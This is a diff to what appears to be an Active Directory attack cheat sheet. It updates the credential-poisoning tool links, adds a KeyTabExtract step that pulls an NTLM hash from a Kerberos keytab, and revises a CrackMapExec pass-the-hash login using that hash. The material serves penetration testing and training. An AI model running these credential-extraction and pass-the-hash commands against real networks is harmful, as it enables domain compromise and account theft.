@@ -75,7 +75,8 @@
 ## Tools
 
 * [Impacket](https://github.com/CoreSecurity/impacket) or the [Windows version](https://github.com/maaaaz/impacket-examples-windows)
-* [Responder](https://github.com/SpiderLabs/Responder)
+* [Responder](https://github.com/lgandx/Responder)
+* [InveighZero](https://github.com/Kevin-Robertson/InveighZero)
 * [Mimikatz](https://github.com/gentilkiwi/mimikatz)
 * [Ranger](https://github.com/funkandwagnalls/ranger)
 * [BloodHound](https://github.com/BloodHoundAD/BloodHound)
@@ -1669,7 +1670,7 @@ PXE allows a workstation to boot from the network by retrieving an operating sys
     PS > Get-PXECreds -InterfaceAlias « lab 0 » 
 
     # Wait for the DHCP to get an address
-    >> Get a valid IP adress
+    >> Get a valid IP address
     >>> >>> DHCP proposal IP address: 192.168.22.101
     >>> >>> DHCP Validation: DHCPACK
     >>> >>> IP address configured: 192.168.22.101
@@ -1778,9 +1779,20 @@ $ klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
 [26] Service principal: host/COMPUTER@DOMAIN
 	 KVNO: 25
 	 Key type: 23
-	 Key: 6b3723410a3c54692e400a5862256e0a
+	 Key: 31d6cfe0d16ae931b73c59d7e0c089c0
 	 Time stamp: Oct 07,  2019 09:12:02
 [...]
+```
+
+On Linux you can use [`KeyTabExtract`](https://github.com/sosdave/KeyTabExtract): we want RC4 HMAC hash to reuse the NLTM hash.
+
+```powershell
+$ python3 keytabextract.py krb5.keytab 
+[!] No RC4-HMAC located. Unable to extract NTLM hashes. # No luck
+[+] Keytab File successfully imported.
+        REALM : DOMAIN
+        SERVICE PRINCIPAL : host/computer.domain
+        NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky
 ```
 
 On macOS you can use `bifrost`.
@@ -1792,12 +1804,9 @@ On macOS you can use `bifrost`.
 Connect to the machine using the account and the hash with CME.
 
 ```powershell
-$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "6b3723410a3c54692e400a5862256e0a" -d "DOMAIN"
-CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c54692e400a5862256e0a  
+$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "31d6cfe0d16ae931b73c59d7e0c089c0" -d "DOMAIN"
+CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0  
 ```
-
-
-
 
 ## References
 
